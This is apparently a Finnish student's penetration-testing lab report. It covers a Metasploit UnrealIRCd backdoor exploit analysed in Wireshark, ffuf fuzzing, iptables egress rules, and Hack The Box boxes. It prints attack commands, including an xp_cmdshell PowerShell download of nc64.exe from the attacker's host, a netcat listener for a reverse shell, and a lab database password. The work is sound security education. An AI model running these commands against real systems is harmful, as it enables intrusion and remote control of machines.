# Harjoitus 3 Nuuskija

# a) Hyökkää

Valitsin hyökkäykseksi edellesissä harjoituksessani tekemäni UnrealIRCd hyökkäyksen (https://github.com/panupeltola/tunkeutumistestaus/blob/main/Harjoitus2.md)
Teen hyökkäyksen samoin, kuin edellisessä harjoituksessa. Kuuntelen tällä kertaa kuitenkin kaiken liikenteen Wiresharkilla.
Hyökkäys tehdään kahden oikeasta verkosta poistetun virtuaalikoneen välillä, siten ulkopuolisen liikenteen riski ei ole olennainen, eikä tiedoissa ole peiteltävää.

Tein normaalit ping testit tämän varmistaakseni ja säädin metasploitin kuntoon.

![kuva](https://github.com/user-attachments/assets/4a3f4e9c-b676-4050-a364-9aa42401129d)

Valitsin oikean hyökkäyksen, payloadin ja kohteen. Tällä kertaa katson, toimiiko ohjelma kun olen avannut portin 4444 palomuurista. Edellisellä kerralla se aiheutti ongelman, eikä yhdistäminen onnistunut ennen palomuurin sulkemista.

![kuva](https://github.com/user-attachments/assets/a07813d5-6d9c-4e7c-9ebf-e1c167134f30)

Hyökkäys onnistui. Itseäni jäi hyökkäyksessä hämäämään näkyvät echo komennot. Tutkin niiden kohtaloa seuraavissa kohdissa enemmän.
Hyökkäys itsessään käyttää IRC palvelinta hyökkäyksen toteuttamiseen. Kohteena on UnrealIRCd demoni, joka on avoimen lähdekoodin IRC palvelin. Katsoin nopeasti Wiresharkin kaappaamaa tietoa ja huomasin hyökkäksen ilmeisesti injektoivan shellin telnet yhteyden avulla.

![kuva](https://github.com/user-attachments/assets/83640498-54b3-4091-b50c-15a9b18677f9)

Halusin ensin nähdä, miten koodi toimii ennen sen syvällisempää analyysiä. Analyysi tehdään seuraavissa kahdessa kohdassa. 

# b) Koodi

Minulla ei ollut tällä koneella Microa asennettuna, joten käytin Nanoa. Katsoin käytetyn exploitin viemällä metasploit session taka-alalle CTRL+Z näppäinyhdistelmällä.

Katsoin hyökkäyksen olevan kansiossa unix/irc/unreal_ircd_3281_backdoor.

![kuva](https://github.com/user-attachments/assets/25f3df88-b595-43bd-9153-c55b40afd4bd)


Tämän jälkeen avasin tiedoston kulkemalla luennolla opittua polkua sekä tabulaattoria ja avasin tiedoston komennolla 'nano /usr/share/metasploit-framework/modules/exploits/unix/irc/unreal_ircd_3281_backdoor.rb'

Katsoin koodia ja ensimmäisenä tuli vastaan kohteen tiedot määrittelevä kenttä.

![kuva](https://github.com/user-attachments/assets/1e716c5b-e6b5-4a98-a82e-3ea3163eea91)

Siinä määriteltiin sen tiedot ja vaatimukset Metasploitin toimintoja ja hakuominaisuuksia varten.

Tämän alla oli itse haitallinen koodi.

![kuva](https://github.com/user-attachments/assets/022ea0fa-9bf3-44d1-947e-cebd51fc59f3)

Koodi oli erittäin lyhyt.

Ymmärtääkseni koodissa haettiin ensin palvelimen banner tiedot ja käyttäjänimeä pyydettäessä lähetettiin "AB; ja payloadin koodi sekä rivin vaihto"

Halusin ymmärtää hiukan miten tämä pystyi toimimaan. Koodin kuvauksessa mainitaan myös, että tämä käyttää "malicious backdooria" eli oletettavasti takaovi olisi tahallinen.

Googlasin asiaa ja löysin aiheesta bugi-ilmoituksen, jossa asia selitettiin ainakin jollain tasolla.
Version latausta oli ulkopuolisen tason osalta muokattu ja siihen oli istutettu takaovi, joka teki systeemitason kutsun debuggauksen muodossa.
Tämä takaovi antoi hyökkääjälle oikeudet ajaa mitä tahansa komentoa palvelinta käyttävän käyttäjän oikeuksilla ja ohitti kaikki salasanat sekä muut turvatoimet (https://www.openwall.com/lists/oss-security/2010/06/14/11)

Parhaan ymmärrykseni mukaan komento "AB;" nimikentässä avasi siis oikeuden hyökkääjälle ajaa haluamansa komennot

# c) snifsnif
Aloitin ensimmäisestä rivistä ja valitsin siitä "Follow TCP trail"

![kuva](https://github.com/user-attachments/assets/f09ebcbd-6432-42de-90bd-c05ae3d1055e)

Alla näkyi tutun näköinen koodi. "AB;" jälkeen oli kuitenkin itselleni oudon näköistä koodia. Tutkin oliko kyseessä payloadin ajama koodi ja komennolla 'nano /usr/share/metasploit-framework/modules/payloads/singles/cmd/unix/reverse.rb' avasin käyttämäni payloadin lähdekoodin.

![kuva](https://github.com/user-attachments/assets/db311408-89b8-4469-bb01-84cca2e74cbd)

Siitä katsoin, että koodi näyttää samalta, eli vain AB; osa on payloadin osaa.
Wireshark siis näyttää, että tällä komennolla luotiin telnet yhteys metasploitablen ja hyökkäyskoneen välille.

![kuva](https://github.com/user-attachments/assets/3700f949-44a5-4c04-8742-276372738d57)

Seuraavassa vaiheessa näin, kun payloadin määrittämä portti 4444 lähettää kohteelle echo sanomia.

![kuva](https://github.com/user-attachments/assets/eda55a4b-3430-46ec-b52a-70a7419e8dcb)

Vastaus tulee kuitenkin vasta seuraavassa ketjussa, jossa metasploitable lähettää virhesanomia ja vastaa 'echo' pyyntöihin

![kuva](https://github.com/user-attachments/assets/033e3ef9-053f-431b-97dd-c9dda12cb940)

Katsoessani paketteja huomasin, että hyökkäyskone lähettää saman 'echo' komennon kaksi kertaa riveillä 26 ja 28. Vastaukseksi se saa kuitenkin rivillä 27 sekavaa mössöä ja rivillä 29 oikean echo vastauksen.
Rivillä 32 lähetetty echo saa myös vastauksen.

Muuta syytä echojen lähettelylle kuin yhteyden testaamisen tai isännän määrittämisen lisäksi en ymmärrä.

![kuva](https://github.com/user-attachments/assets/45cfac49-1e4e-43f5-8430-bc99a24bfbdb)

Katsoin Metasploitin ilmoituksia vielä kerran.
Näin Wiresharkista, miten yhteys muodostettiin ja miten takaovi lähetettiin. Näin myös 'echo' komennot ja ilmeisesti kyseessä oli juurikin isännän valinta.
Ymmärtääkseni siis tässä hyökkäyksessä ei ole sen monimutkaisemmasta haavoittuvuudesta kyse, kuin tahallisesti asennetusta takaovesta, joka mahdollistaa haitallisen koodin ajamisen käyttäjän tunnuksilla.

Alla linkki dataan.

https://easyupload.io/ng17si

# e) FUZZ

Seurasin Teron ohjetta virtuaaliympäristön laatimiseen. (https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/)

![kuva](https://github.com/user-attachments/assets/9f823330-280f-4e06-a803-cbfc7299d462)

Sivu toimi osoitteessa 127.0.0.2:8000 komennon ajamisen jälkeen, eli ympäristö toimi.
Seuraavaksi latasin ja purin ffufin Teron ohjeessa olevilla komennoilla.

![kuva](https://github.com/user-attachments/assets/ec3bd71c-de57-47e5-a652-ec8bdd6cb9d3)

Lataus toimi ja ohjelma käynnistyi.

Seuraavaksi latasin hakemiston, jossa oli yleisimmät hakemistot, jotta voin fuzzata (koettaa tietyn sanan tilalla listan hakusanoja) ja hakea siten yleisimpiä hakemistoja, jotka on voinut jäädä salaamatta tai vahingossa verkkoon.

Hain sen Teron ohjeessa olevalla komennolla.

Seuraavaksi rakensin komennon sivun fuzzaamiseen. Yritin komentoa './ffuf -w common.txt -u http://127.0.0.2:8000/FUZZ' komennossa '-w common.txt' määrittää käytetyn sanalistan ja '-u http://127.0.0.2:8000/' kohde osoitteen. Sana FUZZ määrittää mitä sanaa ohjelma muuttaa eri hauilla. Ajoin komennon.

Samoin kuten Teron ohjeessa, myös tässä osassa kaikki näyttivät statusta 200, eli haku onnistui. Se ei kuitenkaan auta tässä tilanteessa, sillä kaikki toimivat. Ohjeeseen verrattuna erona on, että kaikki vastaukset ovat 154 tavua pitkiä. Muokkaan Teron ohjeen mukaisesti omaa komentoani muotoon '/ffuf -w common.txt -u http://127.0.0.2:8000/FUZZ -fs 154'.
'-fs' filtteröi vastauksen koon mukaan.
Ajoin komennon uudelleen.

![kuva](https://github.com/user-attachments/assets/28b6f596-d1f1-4dba-97e7-cbbfa734d927)

Tällä kertaa sain vastukseksi pienemmän listan.
Koetin hakea näitä 'curl' komennolla.

![kuva](https://github.com/user-attachments/assets/0292105d-de94-443c-a16b-43829235d504)

.git hakemistot antoivat samankaltaiset vastaukset, jossa näkyi lippu.

Sain saman vastauksen myös löydetysttä wp-admin sivusta. Sivu aukesi myös selaimella.

![kuva](https://github.com/user-attachments/assets/011ee359-708d-4688-ae0b-01b6701fae90)

Totesin Fuzzauksen onnistuneeksi.

# f) HTB

## Ennen aloittamista yhteyden varmistaminen

Ennen aloittamista halusin varmistaa yhteyteni vain Hack The Boxin kohdekoneelle. HTB:n säännöissä kerrottiin, että maalikoneet ovat verkossa 10.10.10.0/24.
Mietin toimivaa verkon rakennetta ja tulin tulokseen, että vain lähetettävää liikennettä tulee säädellä. Sisään tulevalla liikenteellä ei tässä tapauksessa ole väliä.
Googlasin tähän ratkaisua ja löysin 'iptables' komennon, jolla voi säätää tulevaa ja lähtevää liikennettä access listien tavoin.
Katsoin 'man iptables' ja totesin että oletuksena iptablesilla on kolme eri tyyppistä liikennettä:
- INPUT eli sisään tuleva liikenne
- FORWARD eli laitteen läpi kulkeva liikenne
- OUTPUT eli laitteen tuottama liikenne

Näistä halusin siis kieltää kaiken FORWARD ja OUTPUT liikenteen paitsi 10.10.10.0/24 menevän OUTPUT liikenteen
Liikenteen estäminen tehdään komennolla 'DROP'
Ohjeen löytämiltäni foorumeilta komento oli muutettu muotoon 'iptables -P OUTPUT DROP'
Koetin pingiä ennen ja jälkeen tämän komennon.

![kuva](https://github.com/user-attachments/assets/e299103d-6131-4fbd-a3ee-44ae8ba47177)

Olin sulkenut verkon.
Tein seuraavaksi saman FORWARD liikenteelle. En usko, että tällä on väliä, mutta pelaan mielummin varman päälle.
Liityin HTB sivuilta lataamaani ja VPN yhteyksiini lisäämän lab_passeli openvpn yhteyden ja hain sitä ifconfigilla

![kuva](https://github.com/user-attachments/assets/daa1bd3a-e3a5-4948-8a06-2c669478f7ac)

Näin sen käyttävän verkkokorttia tun0. Täten liikenne saisi kulkea vain sen kautta.
Tässä vaiheessa en oikein osannut edetä ja kysyin ChatGPT:ltä apua promptilla "using linux kali and iptables how do I accept outbound networking only to network 10.10.10.0/24"
Ohje oli mennyt oikein tähän asti, mutta nyt piti lisätä sääntö ulos menevälle liikenteelle.

GPT antoi ohjeeksi komennon 'sudo iptables -A OUTPUT -d 10.10.10.0/24 -o tun0 -j ACCEPT'

Katsoin manuaalista tämän komennon:

- '-A' lisää uuden säännön sääntölistan loppuun
- OUTPUT koskee lähtevää liikennettä
- '-d' määrittää kohdeverkon
- 10.10.10.0/24 määrittää verkon osoitteen
- '-o' määrittää uloslähtölaitteen
- 'tun0' on verkkokortti. Tällä kertaa kävi onni ja laite oli sama kuin ylempänä 'ifconfigilla' hakemani 
- '-j' Määrittää miten toimia jos nämä ehdot täyttyvät
- ACCEPT hyväksyy liikenteen

Ymmärtääkseni tämä komento lisää siis säännön, joka sallii koneelta ulos lähtevän liikenteen kohteeseen 10.10.10.0/24 VPN käyttämän verkkolaitteen kautta.

Tämän lisäksi ChatGPT luoma ohje suositteli sallimaan vielä liikenteen loopback adapterille komennolla 'sudo iptables -A OUTPUT -o lo -j ACCEPT'
Lisäsin myös sen.

![kuva](https://github.com/user-attachments/assets/4347090f-98af-4b53-9281-d1ed58edb591)

Nyt sain yhteyden aiemmin HTB luomaan virtuaalikoneeseen, mutten Googlen DNS palvelimeen. Nähdäkseni tämä konfiguraatio siis teki mitä pitää.
Jatkoin tehtävän tekemistä onnellisena ja päätin miettiä asetusten nollaamista myöhemmin. Ajattelin, että jos en tallenna asetuksia niin ne eivät luultavasti säily koneen uudelleen käynnistämisen yli.

## Hyökkäys
Valitsin kohteekseni koneen PermX

Ensimmäisenä oli ongelma, että en saanut yhteyttä koneeseen. Ongelman syynä oli, että koneen osoite oli sallimani OUTPUT liikenteen ulkopuolella.
Sallin sen komennolla 'sudo iptables -A OUTPUT -d 10.10.11.23 -o tun0 -j ACCEPT'
Tämän jälkeen vielä varmistin, ettei kone ollut muuhun ulkoverkkoon yhteydessä.

![kuva](https://github.com/user-attachments/assets/4f32960f-9716-4624-a4e8-6c58af6986c5)

Kaikki näytti hyvältä ja uskalsin aloittaa koneeseen hyökkäämisen.

Tässä vaiheessa hiiren kursori katosi täysin näytöltä ja tuleepahan selvitettyä tallentuvatko asetukset iptablesiin koska kone piti käynnistää uudelleen.

![kuva](https://github.com/user-attachments/assets/440ee6bd-01c0-4955-91cc-44b1f2024586)

Ping toimi, eli asetukset nollaantuivat.

Päätin ajaa komennot:
'sudo iptables -P OUTPUT DROP'
'sudo iptables -P FORWARD DROP'
'sudo iptables -A OUTPUT -d 10.10.11.23 -o tun0 -j ACCEPT'

Ennen ajamista testasin toimiiko verkko VPN läpi ylipäätään.

![kuva](https://github.com/user-attachments/assets/bfce77e4-571d-400c-9c40-8cb36c9b4edc)

Totesin, etten ole verkkoon yhteydessä tämän VPN yhteyden kautta.

Katsoin vielä löytyykö kone:

![kuva](https://github.com/user-attachments/assets/45471cf9-fbd1-484f-97d2-eae80febff8a)

Kone löytyi. Totesin kuitenkin, että aiemmin tekemäni muutokset iptablesilla eivät olleet tässä tapauksessa tarpeellisia, mutta hyvä oli tämäkin taito jatkon kannalta opetella.

Aloitin hyökkäyksen skannaamalla aktiiviset portit komennolla 'sudo nmap -A -p- 10.10.11.23'.

Yrittäessäni tehdä seuraavaa askelta ja katsoa auki porttiskannauksesta löytynyttä http osoitetta, totesin että verkkosivut toimivat äärimmäisen hitaasti eivätkä suostu avautumaan.
Sama toistui toista konetta yrittäessäni. Päätin tässä vaiheessa ylipäätään siirtyä askeleen taakse päin ja tehdä lisää Starting Point harjoituksia, koska ne tuntuivat enemmän omalle tasolleni sopivilta.

*12.11.2024 klo 20:09*

Edelliset tehtävät jäivät kesken, sillä mikään verkkosivu ei jaksanut ladata. Päätin yrittää ottaa eri VPN vaihtoehdon ja dokumentoida tämän vaiheen myös paremmin. Aloitin lataamalla haluamani VPN vaihtoehdon HTB:n sivuilta

![kuva](https://github.com/user-attachments/assets/4121bde9-8455-42f2-8941-818d01dfdeac)

Klikkasin ruudun yläreunassa olevaa ethernet portin kuvaa ja vein hiiren VPN Connections painikkeen päälle ja valitisn Add a VPN connection

![kuva](https://github.com/user-attachments/assets/bc4cd240-7e2f-4a14-b374-6161f5d0cf6d)

Valitsin alasvetovalikosta "Import a saved VPN configuration..." ja painoin Create

![kuva](https://github.com/user-attachments/assets/7640136f-87d5-4005-8362-969d6cfc3fd3)

Valitsin haluemani tiedoston ja sain painoin seuraavassa ruudussa "Save"

![kuva](https://github.com/user-attachments/assets/4ac25ea4-98fb-468e-ad93-6fb3ac65fa4e)

Lopuksi valitsin alussa näyttämästäni alasvetovalikosta oikean yhteyden.
Koetin yhteyttä pingaamalla tuttuja osoitteita

![kuva](https://github.com/user-attachments/assets/75519892-f883-4097-be83-e547d8a1bb34)

Kone ei ole yhteydessä julkiseen verkkoon. Tämän takia teen toisella koneella itse tehtävän ja siitä näen myös, että yhteyden muodostaminen on onnistunut.

![kuva](https://github.com/user-attachments/assets/8c98e182-0037-464d-a364-cd84424a580d)

## Archetype

Valitsin ensimmäiseksi kohteekseni harjoituksen Archetype. Loin koneen ja odotin sen käynnistämistä.

Asia on itselleni uutta, niin käytän HTB:n tuottamaa ohjetta apuna niiltä osin, kun en itsenäisesti asiaa osaa.

![kuva](https://github.com/user-attachments/assets/ee94cf17-cd01-4722-a669-c0600509ad6f)

Sain yhteyden.

Aloitin ajamalla täyden nmap skannauksen metasploitin kautta komennolla 'db_nmap -A -p- 10.129.145.0'

Skannauksesta näin, että koneella on tietokanta auki portissa 1433

Ohjeen mukaan yritän seuraavaksi kirjautua sisään smb (Server Message Block) palveluun. Skannauksesta näin sen olevan auki. Tein lisähaun palveluun komennolla 'smbclient -N -L \\\\10.129.145.0\\' '-N' näyttää kohteet, joissa ei ole salasanaa ja '-L' näyttää kohteen palvelut

![kuva](https://github.com/user-attachments/assets/020beb10-76d0-49a2-96ec-91966fdc28bd)

Yritin seuraavaksi päästä sisään käyttäjille komennolla 'smbclient -N \\\\10.129.145.0\\{kohde}' 

Pääsin käsiksi backups ja IPC$ kansioihin. Muut vaativat salasanaa.

![kuva](https://github.com/user-attachments/assets/9abb3c54-46b8-4d22-8cb2-893254ee1eae)

Näistä backups kuulosti mielenkiintoisemmalta.

Löysin kansiosta tiedoston nimeltä prod.dtsConfig. Tässä vaiheessa tuli kuitenkin pieni ongelma itselleni, sillä en osannut Windows koneessa tehdä niinkään yksinkertaista toimintoa, kuin lukea tiedostoa. Katsoin ohjeesta ja siellä suositeltiin lataamaan tiedosto 'get' komennolla. Tein sen.

![kuva](https://github.com/user-attachments/assets/04f86a1f-18bb-400f-a2b2-37c13bd37d78)

Tiedostosta löytyi selkokielinen salasana ja käyttäjä ilmeisesti sql_svc palveluun. Salasana oli M3g4c0rp123.

![kuva](https://github.com/user-attachments/assets/3fc92fb2-4d36-4b23-868c-a75e021f3844)

Koetin seuraavaksi katsoa tietokannastani onko tällaista palvelua avoinna.

![kuva](https://github.com/user-attachments/assets/52c320a1-a4e5-4823-9b23-51f66bc616c7)

SQL palvelin on auki portissa 1433.

HTB seuraavana tehtävänä oli avata seuraavaksi yhteys Microsoft SQL Serveriin Impacket kokoelman scriptillä. Nopealla googlausella löysin sen olevan 'mssqlclient.py' (https://www.kali.org/tools/impacket-scripts/).
Katsoin ohjeesta komentoa ja totesin ohjeen olevan melko sekava.

![kuva](https://github.com/user-attachments/assets/9497cc94-235d-4a17-a84f-fe1a6b9bd90c)

Katsoin esimerkin ohjeesta ja sain komennoksi
'impacket-mssqlclient ARCHETYPE/sql_svc@10.129.145.0 -windows-auth'
- ARCHETYPE/sql_svc on käyttäjä
- 10.129.145.0 on kohteen osoite
- -windows-auth laittaa windowsin oman tunnistuksen päälle
  
![kuva](https://github.com/user-attachments/assets/0fb6986f-c8b8-4879-a223-1ea9c24e760f)

Olin sisällä. Seuraavaksi piti hakea komento, jolla saadaan shell auki.

(https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16)

Tämän Microsoft ystävällisesti opetti minulle olevan xp_cmdshell.

Komento oli kuitenkin estetty. Onneksi Microsoft opetti minulle kuinka se avataan. (https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver16)
Käytetyt komennot alla:

![kuva](https://github.com/user-attachments/assets/17724b11-0296-402c-aded-85c05bc6e4f9)

Sain oikeudet muutettua, mutta tässä vaiheessa minulla loppui oma osaaminen ja päädyin ohjeen pariin.

Seuraavassa vaiheessa latasin haitallisen ohjelman, laitoin yksinkertaisen http palvelimen ja avasin kuuntelevan portin netcatilla.

Tein sen komennolla 'sudo python3 -m http.server 80' ja 'sudo nc -lvnp 443'

Seuraavaksi palasin tietokantaan ja avasin PowerShellin komennolla 'xp_cmdshell "powershell -c pwd"

Seuraavassa vaiheessa lataamme avatusta Kalin palvelimesta ohjelman, jolla voimme nostaa oikeuksia. Lataus tapahtuu komennolla 'xp_cmdshell "powershell -c cd C:Users\sql_svc\Downloads; wget http://10.10.14.233/nc64.exe -outfile nc64.exe"'

![kuva](https://github.com/user-attachments/assets/93dc8b3b-b83b-4f10-9784-d5aa7519191f)

Palvelin antoi vastauksen 200, eli tämä oletettavasti onnistui.

*13.11.2024*

Jatkoin tehtävää työpäivän jälkeen. Eilen tilanne törmäsi siihen, että en saanut tiedostoa ladattua. Ongelmana latauksessa oli, että haltuun saadun käyttäjän käyttöoikeudet eivät riittäneet, kun komento yritti ladata system32 kansioon.

Tehtävää aloittaessani totesin, että kohdekoneen IP on uusiutunut. Koetin siis pääsenkö vielä ajamaan sillä xp_cmdshell komentoja.

![kuva](https://github.com/user-attachments/assets/04ae1373-bdfb-472d-86a0-824fcf98bde7)

Kone oli nollaantunut, sallin siis tämän uudelleen ja toimin aiemmin raportissa tekemieni ohjeiden mukaisesti, toki kohdekoneen IP-osoitteen muuttaen.

![kuva](https://github.com/user-attachments/assets/dd2c940e-19dc-4268-916f-d6f712d35134)

Sain komentoni takaisin.

Avasin ohjeen mukaiset ohjelmat isäntäkoneeseen ja yritin ladata tiedostoa uudelleen.

Kokosin komennon 'xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.233/nc64.exe -outfile nc64.exe"'

Komentoa ajaessani unohdin lopun heittomerkit ja sain sillä ilmeisesti koneen kaadettua. Opinpahan tämänkin.

Kone nollaantui sen uudelleen käynnistämisenyhteydessä, joten tein äskeiset askeleet uudelleen. Päivityksenä, että oletettavasti kone ei kaatunutkaan, vaan käytin väärää IP-osoitetta siihen yhdistämisessä. Väärin kirjoitettu komento kuitenkin lukitsi komentorivin, enkä pystynyt siinä yhteydessä jatkamaan.

![kuva](https://github.com/user-attachments/assets/5fb696d6-5b18-4112-a18d-a0e2e975e678)

GET pyyntö näkyy taas.

Kone katosi kolmannen kerran. En ymmärrä. En keksi virhettäni. SQL tuntuu kaatuvan aina samassa komennossa, vaikka se saa vastauksen palvelimeltani. Portit 80 ja 443 ovat kuuntelussa. Luin käyttämäni komennon läpi, mutten löytänyt siitä virhettä. En keksinyt tapaa korjata tilannetta, enkä halunnut tuhlata enempää aikaa tähän. Vaihdoin toiseen koneeseen ja päätin katsoa videoratkaisun tähän myöhemmin, jotta näen periaatteen miten olisin jatkanut jos lataus olisi toiminut.

## Explosion

Uusi kone uusi yritys.

![kuva](https://github.com/user-attachments/assets/7710f4bb-6edd-42dd-a46c-a1e5a9e4af3e)

Yhteys toimi oikein.

RDP tarkoitti Wikipedian mukaan Remote Desktop Protocol, eli työpöydän Microsoftin oma etäohjaus työkalu.

Etenin kysymyksissä, kunnes tuli aika skannata. En avannut turhaan msfconsolea vaan ajoin suoraan komennon 'sudo nmap -A -p- 10.129.43.244'

Skannauksesta selvisi, että terminaalipalvelin on auki portissa 3389.

![kuva](https://github.com/user-attachments/assets/f2acd50b-a45a-492f-8a36-9059067fca07)


Skannauksen aikana tutkin mitä seuraavaksi tehdään. Hyökkäyksessä käytetään ohjelmaa xfreerdp. TÄmä ohjelma luo etäyhteyden käyttäen telnet yhteyttä. Ajoin komennon 'xfreerdp /v: 10.129.43.244'

Tämä aiheutti error viestin, sillä en ollut määrittänyt käyttäjää. Ohjetta seuraten määritin käyttäjän ja ohjeistin ohittamaan kaikki sertifikaattiin liittyvät tarkistukset komennolla 'xfreerdp /v:10.129.43.244 /cert:ignore /u:Administrator'

![kuva](https://github.com/user-attachments/assets/27bc5712-7d3f-4dde-866b-bb46fd4720f3)

Sain avattua etäyhteyden. Ikkuna kuitenkin sulkeui ja yhteys katkesi aina kun yritin liittyä koneeseen. Ilmeisesti tämä on yleinen ongelma HTB palveluissa, missä tulee maksimi määrä käyttäjiä vastaan ja palvelu ei enää yksinkertaisesti toimi. Tämä oli viimeinen askel ennen lipun saamista. Laskin kuitenkin tehtävän onnistuneeksi, koska ongelma ei ole itselläni. En kuitenkaan halua hyökätä tässä harjoituksessa enää Windows koneisiin.

## Mongod

Viimeisenä päätin vielä ratkaista Mongod koneen Starting pointista.

Avasin koneen ja skannasin sen portit.

![kuva](https://github.com/user-attachments/assets/2fc01885-e7cf-4d7c-8e0d-b81ddae5237a)


Kohteessa oli kaksi porttia auki, ssh ja mongodb.

Ohjeen mukaan yritin kirjautua tietokantaan komennolla 'mongosh mongodb://10.129.228.30:27017' Tässä IP-osoite muutettu, mongosh kutsuu mongon shelliä ja mongodb määrittääkohdeosoitteen ja portin.


![kuva](https://github.com/user-attachments/assets/5a057e9e-8764-49e9-ba6c-f4633f794ff6)

Tämäkään ei suostunut yhdistämään. Huomasin, ettei VPN ollut päällä.

Yritin komentoa uudelleen ja tällä kertaa se jäi paikalleen.

![kuva](https://github.com/user-attachments/assets/8d9d4297-b3d6-455a-9a03-52ad30dad76f)

Odotin 15 minuuttia ja mitään ei tapahtunut. En jaksanut odottaa enempää. En ollut järin innoissani tämän palvelun toimivuudesta ja olin tuhlannut suuren määrän tunteja vain saadakseni jotain toimimaan. En saanut yhteyttä tietokantaan, joten en pystynyt etenemään. Antiklimaattinen loppu.

# Lähteet:

1. T. Karvinen, 2023, Find Hidden Web Directories - Fuzz URLs with ffuf, https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/, luettu 12.11.2024
2. OpenWall, Re: CVE request: UnrealIRCd 3.2.8.1, https://www.openwall.com/lists/oss-security/2010/06/14/11, luettu 12.11.2024
3. 'man iptables' luettu 12.11.2024
4. ChatGPT, Prompt:"using linux kali and iptables how do I accept outbound networking only to network 10.10.10.0/24" luettu 10.11.2024
5. HackTheBox ohjeet Archetype, Mongod ja Explosion, luettu 12.11.2024 ja 13.11.2024




